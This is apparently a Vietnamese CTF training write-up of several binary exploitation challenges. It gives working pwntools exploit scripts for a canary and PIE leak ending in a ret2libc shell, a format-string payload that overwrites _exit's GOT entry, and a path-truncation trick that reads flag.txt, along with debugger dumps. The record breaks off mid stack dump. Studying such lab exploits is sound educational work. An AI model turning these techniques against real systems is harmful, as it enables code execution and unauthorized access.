[*] Switching to interactive mode
$ ls
core        passStore_NOPIE     passStore_NOPIE.id2
exploit.py  passStore_NOPIE.id0  passStore_NOPIE.nam
leak.py     passStore_NOPIE.id1  passStore_NOPIE.til
$

```


_______________________________________________________________________________________________________________________________

## training-leak-pie-canary


[binary file and exploit code](https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/passStore_PIE)


### file

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ file passStore_PIE
passStore_PIE: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=269e6bec9af906e772b2b3f1e0b2f1ea8e9aeaac, for GNU/Linux 3.2.0, not stripped

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ checksec passStore_PIE
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

### Source

```c
unsigned __int64 passStore()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Type the password: ");
  read(0, buf, 0x300uLL);
  printf("You typed %s\n", buf);
  printf("Retype: ");
  read(0, buf, 0x300uLL);
  return v2 - __readfsqword(0x28u);
}

```
### main asm

```asm
pwndbg> disass main
Dump of assembler code for function main:
   0x0000555555555258 <+0>:     endbr64
   0x000055555555525c <+4>:     push   rbp
   0x000055555555525d <+5>:     mov    rbp,rsp
   0x0000555555555260 <+8>:     mov    rax,QWORD PTR [rip+0x2db9]        # 0x555555558020 <stdin@GLIBC_2.2.5>
   0x0000555555555267 <+15>:    mov    esi,0x0
   0x000055555555526c <+20>:    mov    rdi,rax
   0x000055555555526f <+23>:    call   0x555555555090 <setbuf@plt>
   0x0000555555555274 <+28>:    mov    rax,QWORD PTR [rip+0x2d95]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x000055555555527b <+35>:    mov    esi,0x0
   0x0000555555555280 <+40>:    mov    rdi,rax
   0x0000555555555283 <+43>:    call   0x555555555090 <setbuf@plt>
   0x0000555555555288 <+48>:    mov    eax,0x0
   0x000055555555528d <+53>:    call   0x5555555551b7 <passStore>
   0x0000555555555292 <+58>:    mov    eax,0x0
   0x0000555555555297 <+63>:    pop    rbp
   0x0000555555555298 <+64>:    ret
End of assembler dump.

```

Chall này chỉ khác chall trước mỗi cái Pie được bật. 

Cũng tương tự như chall trước đó ở phần leak canary. Sau payload1 làm nhiệm vụ leak canary thì đến payload 2 ta sẽ điều khiển luồng thực thi để sao cho tiếp tục nhập được payload. Giờ thì phải xem xem **passStore()** sẽ ret về đâu:

```shell
────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
 ► 0x555555555257 <passStore+160>                 ret
           <0x555555555292; main+58>
    ↓
   0x555555555292 <main+58>                       mov    eax, 0
   0x555555555297 <main+63>                       pop    rbp
   0x555555555298 <main+64>                       ret
    ↓
   0x7ffff7db6d90 <__libc_start_call_main+128>    mov    edi, eax
   0x7ffff7db6d92 <__libc_start_call_main+130>    call   exit
 <exit>

```

ta có thể thấy là ret về lệnh ngay sau lệnh call passStore() ở hàm main 

```python
   0x000055555555528d <+53>:    call   0x5555555551b7 <passStore>
   0x0000555555555292 <+58>:    mov    eax,0x0

```

và 2 lệnh này chỉ khác nhau mỗi 1 byte cuối cùng. Oke vậy ta sẽ có ý tưởng ghi đè byte cuối cùng để ret về. Phải làm thế mà không ghi đè cả addr 8 bytes là do ***Pie*** đang được bật, pie_base luôn đổi.

Ở chall NoPie trước đó mình giải thì mình call back main, trước đó thì có gadget ret, để tránh movaps trong kiến trúc 64bits. Tuy nhiên còn 1 cách tránh stack alignment nữa là. Thay vì call thẳng cái địa chỉ của func như call ngay **main, hay các hàm như printf, read, system**, thì ta có thể call **main + x** miễn sao thỏa mãn rsp và rbp đã được update lại:

```shell
   0x0000555555555258 <+0>:     endbr64
   0x000055555555525c <+4>:     push   rbp
   0x000055555555525d <+5>:     mov    rbp,rsp
   0x0000555555555260 <+8>:     mov    rax,QWORD PTR [rip+0x2db9]

```

Ví dụ ở đây thay vì call back **main**, ta sẽ call **main + 8** thế là bypass việc phải có gadget ret đằng trước. Mình đã vướn ở đây rất lâu ==", và mình cũng đã update thêm cách này ở chall NoPie

Lý do mà phải tránh gadget ret đằng trước ở chall này mà chall trước lại k cần lăn tăn như vậy là vì, chall này Pie được bật mà hiện giờ thì vẫn chưa leak được pie_base, nên là các gadget toàn offset thoi ==". 

À, còn 1 vấn đề nữa là ở payload này, mình phải dùng **send(payload)** thay vì sendline() là vì với sendline thì sẽ gửi thêm **"\n"** làm ghi đè mất byte kế cuối thành **0x0a**.

Sau khi pass được chỗ này thì mọi thứ trông dễ dàng hơn. giờ thì đến việc ta xem phải leak libc trước hay pie_base trước. Tại vì sau khi ta ghi đè trên stack thì nó vẫn ở đó, có nghĩa là payload ghi đè giá trị trên stack có chủ đích về sau **buộc** phải dài hơn payload trước đấy, chứ không thì chẳng thể leak được gì, do đều bị ghi đè cả rồi. 


chall NoPie trước ở payload thứ 3 này, mình đã leak addr của setbuffer ở stack thứ 4, tuy nhiên giờ có 1 vấn đề sau khi không call lại **main** mà call **main+53** thì stack vẫn như cũ, tức là các stack bị ghi đè vẫn còn đó, nó đã ghi đè nốt chỗ stack mà ở chall trước mình leak setbuffer, nên giờ mình cần leak addr ở stack cao hơn.

Hơn nữa muốn leak pie_base thì cần phải leak được địa chỉ của các hàm như này:

```python
0x0000555555555000  _init
0x0000555555555070  __cxa_finalize@plt
0x0000555555555080  __stack_chk_fail@plt
0x0000555555555090  setbuf@plt
0x00005555555550a0  printf@plt
0x00005555555550b0  read@plt
0x00005555555550c0  _start
0x00005555555550f0  deregister_tm_clones
0x0000555555555120  register_tm_clones
0x0000555555555160  __do_global_dtors_aux
0x00005555555551a0  frame_dummy
0x00005555555551b7  passStore
0x0000555555555258  main
0x000055555555529c  _fini

```

Stack sau khi send payload2 để quay lại **main+53**

```shell
pwndbg> stack 50
00:0000│ rsi rsp 0x7fff14ebfa60 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
... ↓            6 skipped
07:0038│         0x7fff14ebfa98 ◂— 0x8dda103545364600
08:0040│ rbp     0x7fff14ebfaa0 ◂— 0x6161616161616161 ('aaaaaaaa')
09:0048│         0x7fff14ebfaa8 —▸ 0x55877522e292 (main+58) ◂— mov eax, 0
0a:0050│         0x7fff14ebfab0 ◂— 0x1
0b:0058│         0x7fff14ebfab8 —▸ 0x7f359a743d90 (__libc_start_call_main+128) ◂— mov edi, eax
0c:0060│         0x7fff14ebfac0 ◂— 0x0
0d:0068│         0x7fff14ebfac8 —▸ 0x55877522e258 (main) ◂— endbr64
0e:0070│         0x7fff14ebfad0 ◂— 0x100000000
0f:0078│         0x7fff14ebfad8 —▸ 0x7fff14ebfbc8 —▸ 0x7fff14ec1346 ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
10:0080│         0x7fff14ebfae0 ◂— 0x0
11:0088│         0x7fff14ebfae8 ◂— 0x8043fcf311f93ffc
12:0090│         0x7fff14ebfaf0 —▸ 0x7fff14ebfbc8 —▸ 0x7fff14ec1346 ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
13:0098│         0x7fff14ebfaf8 —▸ 0x55877522e258 (main) ◂— endbr64
14:00a0│         0x7fff14ebfb00 —▸ 0x558775230da8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55877522e160 (__do_global_dtors_aux) ◂— endbr64
15:00a8│         0x7fff14ebfb08 —▸ 0x7f359a985040 (_rtld_global) —▸ 0x7f359a9862e0 —▸ 0x55877522d000 ◂— 0x10102464c457f
16:00b0│         0x7fff14ebfb10 ◂— 0x7fbdd524e47b3ffc
17:00b8│         0x7fff14ebfb18 ◂— 0x7e28c81b6b733ffc
18:00c0│         0x7fff14ebfb20 ◂— 0x0
... ↓            4 skipped
1d:00e8│         0x7fff14ebfb48 ◂— 0x8dda103545364600
1e:00f0│         0x7fff14ebfb50 ◂— 0x0
1f:00f8│         0x7fff14ebfb58 —▸ 0x7f359a743e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159]
20:0100│         0x7fff14ebfb60 —▸ 0x7fff14ebfbd8 —▸ 0x7fff14ec1397 ◂— 'SHELL=/bin/bash'
21:0108│         0x7fff14ebfb68 —▸ 0x558775230da8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55877522e160 (__do_global_dtors_aux) ◂— endbr64
22:0110│         0x7fff14ebfb70 —▸ 0x7f359a9862e0 —▸ 0x55877522d000 ◂— 0x10102464c457f
23:0118│         0x7fff14ebfb78 ◂— 0x0
24:0120│         0x7fff14ebfb80 ◂— 0x0

```

```python
>>> 0x7fff14ebfac8 - 0x7fff14ebfa60
104
>>> 0x7fff14ebfaa8 - 0x7fff14ebfa60
72
>>> 0x7fff14ebfb58 - 0x7fff14ebfa60
248
```

Như đã thấy thì để leak libc cần tới ***248 bytes***, nếu ghi đè hết ***248 bytes*** trước thì ghi đè nốt mấy cái khác, do đó ta sẽ libc leak sau khi leak và calc pie_base( mình cũng đã update thêm cách solve chall NoPie. Tương tự như chall này).

Thêm nữa thì stack **0d:0068** khá là đẹp với **main** tuy nhiên để đến đc đó cần tới ***104 bytes***, mà chúng ta cần phải nhớ là payload2 để ret về **main+53** để tạo vòng lặp cho việc exploit thì chỉ có ***72 bytes***. do đó để tránh lỗi thì ta sẽ chọn stack **09:0048**, tức là leak đc **main+58**, chỉ việc trừ ***58*** đi là có được main addr

Sau khi có được *main_addr* thì ta trừ đi *offset của main func* sẽ được pie_base, có pie_base thì sẽ tính được addr của các gadget  như **ret, pop rdi** cần thiết cho việc lấy shell.

Sau khi đã xong việc leak pie với payload3. Thì **payload4 = payload2** để 1 lần nữa call lại **main+53** tức là gọi **passStore()** 

Tiếp tục leak libc với ***payload5 = 248 bytes***

payload6 sẽ giống chall trước đó, chỉ khác 1 chỗ là, ta cần tính addr của các gadget dựa vào pie_base. rồi lấy shell như trc.

### exploit code

```python
from pwn import *

binary = ELF('./passStore_PIE')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

#Leak canary
payload1 = b"a"*56
r.sendlineafter(b"Type the password: ",payload1)
r.recvline()

canary = b"\x00"  +  r.recv(7).split(b"\n")[0] 
canary += b"\x00"*(8 - len(canary))
log.info("Leaked canary: " + str(hex(u64(canary))))

#Call back main+53 <=> passStore()
payload2 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p8(0x8d)
r.sendafter(b"Retype: ",payload2)

#leak main+58 to calc pie_base
payload3 = b"a"*72
r.sendafter(b"Type the password:",payload3)

res = r.recvline().split(b"a"*72)[1] 
res = res.split(b"\n")[0]
res += b"\x00"*(8 - len(res))

main_addr_pie = u64(res) - 0x3a #58
log.info("Main addr (pie) leak : " + hex(main_addr_pie)) 
main_offset_pie = binary.symbols['main']
pie_base = main_addr_pie - main_offset_pie
log.info("Main offset pie : " + hex(main_offset_pie)) 
log.info("Pie base addr : " + hex(pie_base)) 

#call back main+53 <=> passStore()
payload4 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p8(0x8d)
r.sendafter(b"Retype: ",payload4)

#leak and calc libc
payload5 = b"a"*248
r.sendlineafter(b"Type the password:",payload5)
r.recvline()

res = r.recv().split(b"\nRetype")[0] 
res += b"\x00"*(8 - len(res))
leak = (u64(res) << 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info("Libc base addr : " + hex(libc_base)) 

system_offset = libc.symbols['system'] 
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_offset = rop.find_gadget(['ret'])[0] 

pop_rdi_ret_addr = pie_base + pop_rdi_ret_offset
ret_addr = pie_base + ret_offset
log.info("pop rdi ; ret addr : " + hex(pop_rdi_ret_addr)) 
log.info("ret addr : " + hex(ret_addr)) 

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info("system addr : " + hex(system_addr)) 
log.info("/bin/sh addr : " + hex(binsh_addr)) 

#get shell
junk = b"a"*56 + p64(u64(canary)) + b"a"*8 
payload6 = junk + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload6)
r.interactive()

```

### result

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_PIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE': pid 27696
[*] Leaked canary: 0xfb6bcbd3beea1c00
[*] Main addr (pie) leak : 0x560b4cfbb258
[*] Main offset pie : 0x1258
[*] Pie base addr : 0x560b4cfba000
[*] Libc base addr : 0x7f0b4bbce000
[*] pop rdi ; ret addr : 0x560b4cfbb1b2
[*] ret addr : 0x560b4cfbb01a
[*] system addr : 0x7f0b4bc1ed60
[*] /bin/sh addr : 0x7f0b4bda6698
[*] Switching to interactive mode
$ whoami
hjn4
$

```




_______________________________________________________________________________________________________________________________



## say

### file

```shell
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/say/say'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

### function

```c
_int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char v4; // [rsp+0h] [rbp-128h] BYREF
  char *v5; // [rsp+8h] [rbp-120h]
  char *v6; // [rsp+10h] [rbp-118h]
  char buf[264]; // [rsp+18h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+120h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  sub_401331(a1, a2, a3);
  printf("Say what now? Tell me!!!\n> ");
  read(0, buf, 256uLL);
  v6 = &v4;
  v5 = buf;
  _printf(buf);
  return 0LL;
}


unsigned int sub_401331()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  signal(14, handler);
  return alarm(5u);
}

void __noreturn handler()
{
  puts("Time's up!");
  _exit(0);
}

int sub_4012BE()
{
  printf("oh, ra la` say e...");
  return system("/bin/sh");
}

```

Mục tiêu của bài này chính là call tới hàm saye để lấy shell. Ta thấy có lỗi fmt, cơ mà có sẵn hàm để lấy shell rồi, nên mình nghĩ ngay đến việc overwrite GOT của hàm nào đó thành dia chi hàm saye.

Ta thấy là sau khi thiết lập bộ đệm với setbuf thì thiết lập thêm hẹn giờ, sao cho sau 5s thì sẽ gửi tín hiệu **SIGALRM**, khi mà nhận được tín hiệu này sẽ gọi **handler** và end program.

Thì mục tiêu là overwrite GOT nên là mình cần đi tìm hàm để ovw, hàm này phải được thực thi sau **printf**, sau 1 đêm ngáo ngơ suy nghĩ thì mình chỉ thấy có mỗi thằng **handler** là có thể được gọi sau khi printf, cơ mà chỉ có thể gọi tới handler khi mà timeup, nên là làm sao để timeup. 

Mình thấy là nếu mà 5s rồi vẫn chưa nhập xong thì timeup, xong mình quay lại xem cơ chế của lỗi fmt cho việc write vào địa chỉ cụ thể. 

Thì cơ chế của nó là, in ra màn hình 15 kí tự thì sẽ ghi giá trị hex(15) = 0xF vào vị trí ở tham số được chỉ định.

Nên là mình sẽ overwrite GOT của **exit()** trong hàm handler sau đấy thì sẽ tiếp tục in ra màn hình để quá 5s và gọi được handler với exit đã được ovw.


Thì đầu tiên mình sẽ tìm xem là giá trị mình nhập vào sẽ là tham số thứ mấy của printf.

```python
from pwn import *

for i in range(20):
    r = process("./say")
    r.send(f"%{i+1}$p")
    log.info(f"{i} : \n")
    log.info( r.recv())
    r.interactive()

```

```shell
[*] Got EOF while sending in interactive
[+] Starting local process './say': pid 4456
[*] 11 :
[*] Say what now? Tell me!!!
    > 0x7024323125
[*] Switching to interactive mode
[*] Process './say' stopped with exit code 0 (pid 4456)
[*] Got EOF while reading in interactive

```

thì mình tìm được là ở tham số thứ 11 của printf. 

Cơ mà lúc exploit, attach gdb vào thì mình thấy ở tham số thứ 12 sẽ là null byte, tiếp theo thứ 13 mới chứa chuỗi payload của mình. 

```shell
────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
 ► 0x40129c    call   0x4012ec                      <0x4012ec>

   0x4012a1    pop    rsi
   0x4012a2    pop    rdi
   0x4012a3    mov    eax, 0
   0x4012a8    mov    rdx, qword ptr [rbp - 8]
   0x4012ac    sub    rdx, qword ptr fs:[0x28]
   0x4012b5    je     0x4012bc                      <0x4012bc>

   0x4012b7    call   __stack_chk_fail@plt                      <__stack_chk_fail@plt>

   0x4012bc    leave
   0x4012bd    ret

   0x4012be    endbr64
─────────────────────────────────[ STACK ]──────────────────────────────────
00:0000│ rsp         0x7ffe754d7290 —▸ 0x7ffe754d72a0 ◂— 0x3125703839373425 ('%4798p%1')
01:0008│             0x7ffe754d7298 —▸ 0x7ffe754d7288 —▸ 0x7ff3a7d452e0 ◂— 0x0
02:0010│ rax rdi rsi 0x7ffe754d72a0 ◂— 0x3125703839373425 ('%4798p%1')
03:0018│             0x7ffe754d72a8 ◂— 0x373532256e682436 ('6$hn%257')
04:0020│             0x7ffe754d72b0 ◂— 0x2570393535373936 ('697559p%')
05:0028│             0x7ffe754d72b8 ◂— 0x2d2d2d2d6e243731 ('17$n----')
06:0030│             0x7ffe754d72c0 —▸ 0x404018 (_exit@got.plt) —▸ 0x401030 ◂— endbr64
07:0038│             0x7ffe754d72c8 —▸ 0x404028 (__stack_chk_fail@got.plt) —▸ 0x401050 ◂— endbr64

```

payload của mình sẽ như sau:

**payload = b"%4798p%16$hn%257697559p%17$n----" +  p64(binary.got['_exit']) + p64(binary.got['_exit'] + 0x10)**

thì 4798 là 0x12be để ghi 2 byte vào tham số thứ 16, ta thấy %4798 .... ---" đã là 32 bytes, 4 stack, chính nó là tham số thứ 11, thêm thằng thứ 12 là null byte, thì chuỗi này chiếm trọn tới tham số thứ 15. Do đó các địa chỉ ở sau sẽ là 16 và 17. 

Thì mình ghi 0x12be vào GOT của _exit(). Xong rồi để gọi được handler() thì mình phải tiếp tục ghi để quá 5s, nên là phần sau sẽ ghi ra màn hình số lượn lớn kí tự và ghi vào 1 địa chỉ bất kì để bypass.


### exploit code


```python
from pwn import *

binary  = context.binary = ELF('./say')
r = process(binary.path)

# gdb.attach(r, api=True)
payload =b"%4798p%16$hn%257697559p%17$n----" +  p64(binary.got['_exit']) + p64(binary.got['_exit'] + 0x10)
r.sendafter(b"\n> ",payload)
print(r.recv())
r.interactive()

# for i in range(20):
#     r = process("./say")
#     r.send(f"%{i+1}$p")
#     log.info(f"{i} : \n")
#     log.info( r.recv())
#     r.interactive()

# 11

```


_______________________________________________________________________________________________________________________________


## log_printer


### file

```shell
▶ checksec log_printer
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/log_printer/log_printer'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

### source


```c
__int64 __fastcall sub_1348()
{
  __int64 v0; // rbp
  int v2; // [rsp-25Ch] [rbp-264h]
  void *v3; // [rsp-250h] [rbp-258h]
  struct stat v4; // [rsp-248h] [rbp-250h] BYREF
  __int64 v5; // [rsp-1B8h] [rbp-1C0h] BYREF
  char v6[144]; // [rsp-1A8h] [rbp-1B0h] BYREF
  char v7[264]; // [rsp-118h] [rbp-120h] BYREF
  unsigned __int64 v8; // [rsp-10h] [rbp-18h]
  __int64 v9; // [rsp-8h] [rbp-10h]

  v9 = v0;
  v8 = __readfsqword(0x28u);
  memset(&v5, 0, 0x10uLL);
  memset(v7, 0, 0x100uLL);
  sub_159A();
  printf("file?\n> ");
  v7[read(0, v7, 0x100uLL) - 1] = 0;
  if ( (unsigned __int8)sub_14EB(v7) )
  {
    snprintf(v6, 0x81uLL, "%s", v7);
    v2 = open(v6, 0);
    if ( v2 >= 0 )
    {
      fstat(v2, &v4);
      v3 = malloc(v4.st_size);
      read(v2, v3, v4.st_size);
      write(1, v3, v4.st_size);
    }
    else
    {
      puts("Invalid!");
    }
  }
  return 0LL;
}


__int64 __fastcall sub_14EB(const char *a1)
{
  char *v2; // [rsp+10h] [rbp-10h]
  char *v3; // [rsp+18h] [rbp-8h]

  v2 = strstr(a1, ".log");
  v3 = strchr(a1, 42);
  if ( v2 && !v3 && &a1[strlen(a1) - 1] - v2 == 3 )
    return 1LL;
  puts("Invalid log file!");
  return 0LL;
}

```

Bài này, sẽ nhận chuỗi input vào v7, sau đấy gọi hàm để filter input, nếu pass thì sẽ tiến hành copy v7 => v6 và open, read, write ra cho mình. Để ý kĩ thì có 1 bug là v7 được nhập 256 bytes, nhưng lúc check xong rồi copy sang v6 thì chỉ cop có 129 bytes, nên là mình có thể lợi dụng điều này để bypass check file name.

Thì check sẽ filter:

- buộc có ".log"
- không chứa kí tự  * 
- sau ".log" thì không có kí tự nào khác 

Thì idea để pass của mình sẽ là :

- aaa...aaaaaflag.txt.log
- flag.txtaaa..aaaaaa.log

Miễn sao cho lúc copy thì cut mất đoạn .log đi, để control thành file mình muốn

Sau khi vắt óc nghĩ và search làm sao để inject fmt vào blabla để ghi đè hay đẩy padding sang tham số khác, thì thầy Dương_saye lúc 2h sáng đã hint cho mình là không cần phải thế.

> search di
> search va suy nghi
> cai gi
> dang truoc flag.txt
> de no van truy van den file flag.txt cua folder hien tai

Sau khi mò 1 hồi thì payload cho bài này của mình là:

**payload = b"." + b"/"*119  + b"flag.txt" + b".log"**

### exploit

```python
from pwn import *
r = process("./log_printer")

payload = b"." + b"/"*119  + b"flag.txt" + b".log"

r.sendline(payload)
print(r.recvline())

r.interactive()

```


## chall1

***chall này mình chưa giải ra*** 

Update: *chall này sau khi đọc wu thì mình thấy khá dễ, do là stack frame trên máy mình có vấn đề nên là mình chịu*


### file

```shell
▶ checksec chall1
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

### source


```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v5; // [rsp+88h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  printf("Enter your name: ");
  fgets(s, 127, stdin);
  printf("Hello ");
  printf(s);
  putchar(10);
  return 0LL;
}


unsigned __int64 __fastcall sub_12C8()
{
  __int64 v0; // rbp
  int v2; // [rsp-134h] [rbp-13Ch]
  unsigned __int64 i; // [rsp-130h] [rbp-138h]
  unsigned __int64 j; // [rsp-128h] [rbp-130h]
  __int64 v5; // [rsp-120h] [rbp-128h]
  unsigned __int64 v6; // [rsp-10h] [rbp-18h]
  _QWORD v7[2]; // [rsp-8h] [rbp-10h] BYREF

  v7[0] = v0;
  v6 = __readfsqword(0x28u);
  srand(0);
  v5 = rand() % 32;
  for ( i = 0LL; i <= 0x1F; ++i )
    v7[i - 34] = calloc(1uLL, 0x80uLL);
  for ( j = 0LL; j <= 0x1F; ++j )
  {
    if ( j != v5 )
      memset((void *)v7[j - 34], j + 65, 0x78uLL);
  }
  v2 = open("flag1.txt", 0);
  if ( v2 < 0 )
    exit(-1);
  if ( read(v2, (void *)v7[v5 - 34], 0x80uLL) < 0 )
    exit(-2);
  close(v2);
  return v6 - __readfsqword(0x28u);
}


```


Chall này tốn mấy ngày của mình vẫn bế tắc.

Nhớ lại lời dặn của thầy

Hjn4 : Ai chơi mà chỉnh file :((

Saye: 

    co
    may con suc vat ak'
    :>

Cơ mà câu này thầy nói cho bài log_printer nhưng mình lại dùng cho luôn bài này, thành ra mình cứ nghĩ làm sao ovwrite được flag1.txt => flag.txt

Xong cái đà suy nghĩ này đưa mình đi xa vcl :((, nếu đã ovw được rồi thì phải đọc lại nó, mà đã đọc lại thì phải nhập được nhiều lần mới xem được, blabla... xa mấy ngày. Cơ mà sau khi thầy D có check lại stack frame của mình thì có bảo là:

Saye: 

    m cho t xem
    truoc khi call printf
    no trong nhu the nao
    debug state
    ....
    a` ok
    neu ma bi vay la may m co van de roi
    qua lam chall2 di


Đây là flow program mà mình debug có được như sau:

Đầu tiên chương trình sẽ chạy thẳng vào luôn hàm đọc file, đó là lý do mà không có file flag1.txt thì không chạy được, thầy D cũng diss mình 1 ver ngay chỗ nàyyy. 

Nó  random v5 % 32 (0 -> 31) mà với cái seed = 0 nên là chạy bao lần thì các số được rand vẫn không đổi. Chỗ này ban đầu mình ngáo ngơ k để ý đi bf :((. Xong thì cấp phát bộ nhớ, gọi memset để set mỗi thg trong mảng v7 từ **A => `** , xong chừa lại cái index cho thg flag
rồi ghi flag lưu vào đấy.
Lúc này trên stack lúc này vẫn bthg như này :


```shell
pwndbg> stack 100
00:0000│ rsp 0x7fffffffdcf0 ◂— 0x300000000
01:0008│     0x7fffffffdcf8 ◂— 0x20 /* ' ' */
02:0010│     0x7fffffffdd00 ◂— 0x20 /* ' ' */
03:0018│     0x7fffffffdd08 ◂— 0x7
04:0020│     0x7fffffffdd10 —▸ 0x5555555592a0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
05:0028│     0x7fffffffdd18 —▸ 0x555555559330 ◂— 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
06:0030│     0x7fffffffdd20 —▸ 0x5555555593c0 ◂— 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
07:0038│     0x7fffffffdd28 —▸ 0x555555559450 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
08:0040│     0x7fffffffdd30 —▸ 0x5555555594e0 ◂— 'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'
09:0048│     0x7fffffffdd38 —▸ 0x555555559570 ◂— 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'
0a:0050│     0x7fffffffdd40 —▸ 0x555555559600 ◂— 'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'
0b:0058│     0x7fffffffdd48 —▸ 0x555555559690 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
0c:0060│     0x7fffffffdd50 —▸ 0x555555559720 ◂— 'IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII'
0d:0068│     0x7fffffffdd58 —▸ 0x5555555597b0 ◂— 'JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ'
0e:0070│     0x7fffffffdd60 —▸ 0x555555559840 ◂— 
.......................
.......................
.......................
